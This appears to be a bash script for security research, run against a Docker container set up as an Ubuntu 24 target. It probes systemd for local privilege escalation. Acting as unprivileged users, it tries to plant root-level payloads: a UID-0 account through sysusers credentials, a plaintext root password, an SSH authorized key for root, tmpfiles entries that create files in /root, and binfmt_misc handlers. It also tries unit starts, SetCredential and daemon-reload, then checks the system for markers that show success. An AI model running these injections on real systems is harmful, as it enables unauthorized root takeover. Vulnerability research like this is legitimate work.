#!/usr/bin/env bash
set -Eeuo pipefail

container="${1:-ubuntu24-server-lpe-target}"
repo_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log_path="$repo_dir/logs/systemd-generators-run-config.out"

mkdir -p "$repo_dir/logs"
: >"$log_path"
exec > >(tee -a "$log_path") 2>&1

echo "systemd generators / run config / credential LPE probe"
echo "target=$container"
date '+%Y-%m-%dT%H:%M:%S%z'

if [[ "$(docker inspect -f '{{.State.Running}}' "$container" 2>/dev/null || true)" != "true" ]]; then
  echo "target container is not running: $container" >&2
  exit 1
fi

docker exec -i "$container" bash -s <<'TARGET'
set +e
export LC_ALL=C

PROBE_BASE=/tmp/systemd-generators-run-config-probe
ROOT_MARKER=/root/systemd_generators_run_config_lpe
TMP_MARKER=/tmp/systemd_generators_run_config_lpe

rm -rf "$PROBE_BASE" "$TMP_MARKER"
rm -f "$ROOT_MARKER"
mkdir -p "$PROBE_BASE"
chmod 1777 "$PROBE_BASE"

section() {
  printf '\n## %s\n' "$1"
}

run_cmd() {
  local label="$1"
  shift
  printf '\n### %s\n' "$label"
  printf '$'
  printf ' %q' "$@"
  printf '\n'
  "$@"
  printf 'rc=%s\n' "$?"
}

as_user() {
  local user="$1"
  local label="$2"
  shift 2
  printf '\n### as %s: %s\n' "$user" "$label"
  runuser -u "$user" -- bash -lc "$*"
  printf 'rc=%s\n' "$?"
}

section "target identity and default package proof"
uname -a
sed -n '1,10p' /etc/os-release
systemctl --version | head -1
dpkg-query -W -f='${binary:Package}\t${Version}\t${Architecture}\t${db:Status-Abbrev}\n' \
  systemd systemd-sysv systemd-dev udev kmod libkmod2 2>/dev/null | sort
id attacker
id selfauth
groups attacker
groups selfauth
getent group sudo adm docker lxd systemd-journal || true

section "root-running unit proof"
systemctl list-unit-files --no-pager \
  systemd-hwdb-update.service systemd-binfmt.service systemd-sysusers.service \
  'systemd-tmpfiles-setup*.service' kmod-static-nodes.service \
  systemd-journal-catalog-update.service systemd-firstboot.service 2>&1
systemctl list-units --all --no-pager \
  systemd-hwdb-update.service systemd-binfmt.service systemd-sysusers.service \
  'systemd-tmpfiles-setup*.service' kmod-static-nodes.service \
  systemd-journal-catalog-update.service systemd-firstboot.service 2>&1
for unit in \
  systemd-hwdb-update.service \
  systemd-binfmt.service \
  systemd-sysusers.service \
  systemd-tmpfiles-setup.service \
  systemd-tmpfiles-setup-dev.service \
  systemd-tmpfiles-setup-dev-early.service \
  kmod-static-nodes.service \
  systemd-journal-catalog-update.service \
  systemd-firstboot.service; do
  echo "### $unit"
  systemctl show -p FragmentPath -p UnitFileState -p ActiveState -p SubState \
    -p ConditionResult -p ExecStart -p ImportCredential -p LoadCredential \
    -p SetCredential "$unit" 2>&1
  systemctl cat "$unit" --no-pager 2>&1 | sed -n '1,120p'
done

section "helper binary proof"
for path in \
  /usr/bin/systemd-hwdb \
  /usr/lib/systemd/systemd-binfmt \
  /usr/bin/systemd-sysusers \
  /usr/bin/systemd-tmpfiles \
  /usr/bin/kmod \
  /usr/bin/journalctl \
  /usr/bin/systemd-firstboot \
  /usr/bin/systemd-creds \
  /usr/lib/systemd/systemd-update-done; do
  stat -Lc '%A %U:%G %s %n' "$path" 2>&1 || true
  getcap "$path" 2>/dev/null || true
done
for path in \
  /proc/sys/fs/binfmt_misc/register \
  "/lib/modules/$(uname -r)/modules.devname" \
  "/usr/lib/modules/$(uname -r)/modules.devname" \
  /usr/lib/udev/hwdb.bin \
  /etc/udev/hwdb.bin \
  /var/lib/systemd/catalog/database; do
  stat -Lc '%A %U:%G %n' "$path" 2>&1 || true
done
mount | grep -E 'binfmt|/run type|cgroup' || true
sysctl kernel.unprivileged_userns_clone kernel.modules_disabled 2>/dev/null || true

section "systemd config/search view"
for kind in binfmt.d sysusers.d tmpfiles.d hwdb.d modules-load.d modprobe.d; do
  echo "### systemd-analyze cat-config $kind"
  systemd-analyze cat-config "$kind" 2>&1 | sed -n '1,160p'
done
for file in /usr/lib/tmpfiles.d/provision.conf /usr/lib/tmpfiles.d/credstore.conf; do
  echo "### $file"
  sed -n '1,120p' "$file" 2>&1
done

section "run and credential directory modes"
for path in \
  /run \
  /run/binfmt.d \
  /run/sysusers.d \
  /run/tmpfiles.d \
  /run/udev \
  /run/udev/hwdb.d \
  /run/modules-load.d \
  /run/modprobe.d \
  /run/systemd \
  /run/systemd/system \
  /run/systemd/generator \
  /run/systemd/generator.early \
  /run/systemd/generator.late \
  /run/systemd/catalog \
  /run/systemd/userdb \
  /run/credentials \
  /run/credentials/systemd-sysusers.service \
  /run/credentials/systemd-tmpfiles-setup.service \
  /run/credentials/systemd-tmpfiles-setup-dev.service \
  /run/credentials/systemd-tmpfiles-setup-dev-early.service \
  /run/credentials/systemd-firstboot.service \
  /run/credstore \
  /run/credstore.encrypted \
  /etc/credstore \
  /etc/credstore.encrypted \
  /proc/cmdline \
  /sys/power/resume \
  /sys/power/resume_offset; do
  if [ -e "$path" ]; then
    stat -Lc '%A %U:%G %n' "$path" 2>&1
  else
    parent="${path%/*}"
    printf 'MISSING %s parent=' "$path"
    stat -Lc '%A %U:%G %n' "$parent" 2>&1 || true
  fi
done

section "default files under candidate roots"
find \
  /etc/binfmt.d /run/binfmt.d /usr/local/lib/binfmt.d /usr/lib/binfmt.d /lib/binfmt.d \
  /etc/sysusers.d /run/sysusers.d /usr/local/lib/sysusers.d /usr/lib/sysusers.d \
  /etc/tmpfiles.d /run/tmpfiles.d /usr/local/lib/tmpfiles.d /usr/lib/tmpfiles.d \
  /etc/udev/hwdb.d /run/udev/hwdb.d /usr/local/lib/udev/hwdb.d /usr/lib/udev/hwdb.d \
  /etc/systemd/catalog /run/systemd/catalog /usr/local/lib/systemd/catalog /usr/lib/systemd/catalog \
  /etc/modules-load.d /run/modules-load.d /usr/local/lib/modules-load.d /usr/lib/modules-load.d \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d \
  /run/systemd/system /run/systemd/generator /run/systemd/generator.early /run/systemd/generator.late \
  -maxdepth 2 -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort | sed -n '1,260p'

section "credential store view"
systemd-creds list --system --no-pager 2>&1 || true
find /run/credentials /etc/credstore /etc/credstore.encrypted /run/credstore /run/credstore.encrypted \
  -maxdepth 3 -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort

section "uid write probes for exact /run paths"
for user in attacker selfauth; do
  as_user "$user" "write candidate /run config and credential paths" '
    set +e
    base="/tmp/systemd-generators-run-config-$USER-$$"
    rm -rf "$base"
    mkdir -p "$base"
    tag="lpe_${USER}_$$"

    try_dir() {
      d="$1"
      existed=0
      [ -e "$d" ] && existed=1
      printf "DIR %s mkdir: " "$d"
      err="$base/err"
      mkdir -p "$d" >"$err" 2>&1
      rc=$?
      tr "\n" " " <"$err"
      printf " rc=%s\n" "$rc"
      f="$d/$tag.conf"
      printf "DIR %s write: " "$d"
      printf "lpe\n" >"$f" 2>"$err"
      rc=$?
      tr "\n" " " <"$err"
      printf " rc=%s\n" "$rc"
      rm -f "$f" 2>/dev/null
      [ "$existed" = 0 ] && rmdir "$d" 2>/dev/null
    }

    try_file() {
      f="$1"
      d="${f%/*}"
      existed=0
      [ -e "$d" ] && existed=1
      printf "FILE %s mkdir-parent: " "$f"
      err="$base/err"
      mkdir -p "$d" >"$err" 2>&1
      rc=$?
      tr "\n" " " <"$err"
      printf " rc=%s\n" "$rc"
      printf "FILE %s write: " "$f"
      printf "%s\n" "$2" >"$f" 2>"$err"
      rc=$?
      tr "\n" " " <"$err"
      printf " rc=%s\n" "$rc"
      rm -f "$f" 2>/dev/null
      [ "$existed" = 0 ] && rmdir "$d" 2>/dev/null
    }

    for d in \
      /run/binfmt.d \
      /run/sysusers.d \
      /run/tmpfiles.d \
      /run/udev/hwdb.d \
      /run/modules-load.d \
      /run/modprobe.d \
      /run/systemd/system \
      /run/systemd/generator \
      /run/systemd/generator.early \
      /run/systemd/generator.late \
      /run/systemd/catalog \
      /run/credstore \
      /run/credstore.encrypted; do
      try_dir "$d"
    done

    try_file /run/credentials/systemd-sysusers.service/sysusers.extra "u lpecred 0 \"lpe\" /root /bin/bash"
    try_file /run/credentials/systemd-sysusers.service/passwd.plaintext-password.root "lpepass"
    try_file /run/credentials/systemd-tmpfiles-setup.service/tmpfiles.extra "f /root/systemd_generators_run_config_lpe 0644 root root - tmpfiles"
    try_file /run/credentials/systemd-tmpfiles-setup.service/ssh.authorized_keys.root "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILPE probe"
    try_file /run/credentials/systemd-tmpfiles-setup-dev.service/tmpfiles.extra "f /root/systemd_generators_run_config_lpe_dev 0644 root root - tmpfiles"
    try_file /run/credentials/systemd-tmpfiles-setup-dev-early.service/tmpfiles.extra "f /root/systemd_generators_run_config_lpe_dev_early 0644 root root - tmpfiles"
    try_file /run/credentials/systemd-firstboot.service/passwd.plaintext-password.root "lpepass"
    try_file /run/credentials/systemd-firstboot.service/firstboot.locale "C.UTF-8"
    try_file /run/credstore/sysusers.extra "u lpecred 0 \"lpe\" /root /bin/bash"
    try_file /run/credstore/tmpfiles.extra "f /root/systemd_generators_run_config_lpe 0644 root root - tmpfiles"
    try_file /run/credstore/ssh.authorized_keys.root "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILPE probe"
    try_file /run/credstore.encrypted/tmpfiles.extra "not encrypted"
    try_file /etc/credstore/tmpfiles.extra "f /root/systemd_generators_run_config_lpe 0644 root root - tmpfiles"

    printf "PROC /proc/cmdline write: "
    printf "systemd.unit=rescue.target\n" >/proc/cmdline 2>"$base/err"
    rc=$?
    tr "\n" " " <"$base/err"
    printf " rc=%s\n" "$rc"

    rm -rf "$base"
  '
done

section "uid system manager trigger and credential injection attempts"
for user in attacker selfauth; do
  as_user "$user" "start/reload root units and transient SetCredential" '
    set +e
    id
    for unit in \
      systemd-hwdb-update.service \
      systemd-binfmt.service \
      systemd-sysusers.service \
      systemd-tmpfiles-setup.service \
      systemd-tmpfiles-setup-dev.service \
      systemd-tmpfiles-setup-dev-early.service \
      kmod-static-nodes.service \
      systemd-journal-catalog-update.service \
      systemd-firstboot.service; do
      echo "UNIT=$unit"
      timeout 8 systemctl --no-ask-password start "$unit" 2>&1
      echo "systemctl_start_rc=$?"
      timeout 8 busctl call --system org.freedesktop.systemd1 /org/freedesktop/systemd1 \
        org.freedesktop.systemd1.Manager StartUnit ss "$unit" replace 2>&1
      echo "busctl_start_rc=$?"
    done
    timeout 8 systemctl --no-ask-password daemon-reload 2>&1
    echo "daemon_reload_rc=$?"
    timeout 8 systemctl --no-ask-password set-environment SYSTEMD_LOG_LEVEL=debug LPE_RUN_CONFIG=1 2>&1
    echo "set_environment_rc=$?"
    timeout 8 busctl call --system org.freedesktop.systemd1 /org/freedesktop/systemd1 \
      org.freedesktop.systemd1.Manager SetEnvironment as 1 LPE_RUN_CONFIG=1 2>&1
    echo "busctl_set_environment_rc=$?"
    timeout 8 systemd-run --system --unit=lpe-run-config-$USER \
      -p SetCredential=lpe.credential:hello /bin/true 2>&1
    echo "systemd_run_setcredential_rc=$?"
  '
done

section "uid direct helper attempts with attacker-controlled config"
for user in attacker selfauth; do
  as_user "$user" "direct helper execution stays unprivileged" '
    set +e
    work="/tmp/systemd-generators-run-config-$USER-helpers-$$"
    rm -rf "$work"
    mkdir -p "$work/creds" "$work/root"
    chmod 700 "$work/creds"
    printf ":lpe-%s:M::LPEMAGIC::/bin/sh:OCF\n" "$USER" >"$work/binfmt.conf"
    printf "u lpe%s 0 \"lpe root\" /root /bin/bash\n" "$USER" >"$work/sysusers.conf"
    printf "f /root/systemd_generators_run_config_lpe 0644 root root - tmpfiles-%s\n" "$USER" >"$work/tmpfiles.conf"
    printf "u lpecred%s 0 \"lpe root\" /root /bin/bash\n" "$USER" >"$work/creds/sysusers.extra"
    printf "f /root/systemd_generators_run_config_lpe 0644 root root - cred-%s\n" "$USER" >"$work/creds/tmpfiles.extra"
    printf "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILPE probe-%s\n" "$USER" >"$work/creds/ssh.authorized_keys.root"
    printf "motd-%s\n" "$USER" >"$work/creds/login.motd"
    printf "lpepass\n" >"$work/creds/passwd.plaintext-password.root"
    printf "payload\n" >"$work/plain"

    timeout 8 /usr/lib/systemd/systemd-binfmt "$work/binfmt.conf" 2>&1
    echo "binfmt_direct_rc=$?"
    timeout 8 bash -c "printf :lpewrite:M::LPEWRITE::/bin/sh:OCF > /proc/sys/fs/binfmt_misc/register" 2>&1
    echo "binfmt_register_write_rc=$?"
    timeout 8 systemd-sysusers "$work/sysusers.conf" 2>&1
    echo "sysusers_file_rc=$?"
    timeout 8 env CREDENTIALS_DIRECTORY="$work/creds" systemd-sysusers 2>&1
    echo "sysusers_credentials_rc=$?"
    timeout 8 systemd-tmpfiles --create "$work/tmpfiles.conf" 2>&1
    echo "tmpfiles_file_rc=$?"
    timeout 8 env CREDENTIALS_DIRECTORY="$work/creds" systemd-tmpfiles --create --boot --exclude-prefix=/dev 2>&1
    echo "tmpfiles_credentials_rc=$?"
    timeout 8 systemd-hwdb update --strict 2>&1
    echo "hwdb_update_rc=$?"
    timeout 8 /usr/bin/kmod static-nodes --format=tmpfiles --output=/run/tmpfiles.d/lpe-$USER.conf 2>&1
    echo "kmod_static_nodes_run_output_rc=$?"
    timeout 8 journalctl --update-catalog 2>&1
    echo "journal_update_catalog_rc=$?"
    timeout 8 systemd-firstboot --force --root-password=lpepass 2>&1
    echo "firstboot_root_password_rc=$?"
    timeout 8 systemd-creds list --system --no-pager 2>&1
    echo "creds_list_system_rc=$?"
    timeout 8 systemd-creds encrypt --with-key=host --name=tmpfiles.extra "$work/plain" /run/credstore.encrypted/tmpfiles.extra 2>&1
    echo "creds_encrypt_run_store_rc=$?"

    rm -rf "$work"
  '
done

section "post-probe root proof check"
ls -l "$ROOT_MARKER" "$TMP_MARKER" 2>&1 || true
grep -E 'lpe(attacker|selfauth|cred)' /etc/passwd /etc/group 2>/dev/null || true
ls -1 /proc/sys/fs/binfmt_misc 2>/dev/null | sort | sed -n '1,80p'
for entry in \
  /proc/sys/fs/binfmt_misc/lpe-attacker \
  /proc/sys/fs/binfmt_misc/lpe-selfauth \
  /proc/sys/fs/binfmt_misc/lpewrite; do
  [ -e "$entry" ] && echo "FOUND $entry" || echo "ABSENT $entry"
done
find /run/binfmt.d /run/sysusers.d /run/tmpfiles.d /run/udev/hwdb.d \
  /run/systemd/system /run/systemd/generator /run/systemd/generator.early \
  /run/systemd/generator.late /run/systemd/catalog /run/credentials \
  /run/credstore /run/credstore.encrypted -maxdepth 3 -name '*lpe*' \
  -printf '%M %u:%g %p -> %l\n' 2>/dev/null | sort

rm -rf "$PROBE_BASE"
exit 0
TARGET
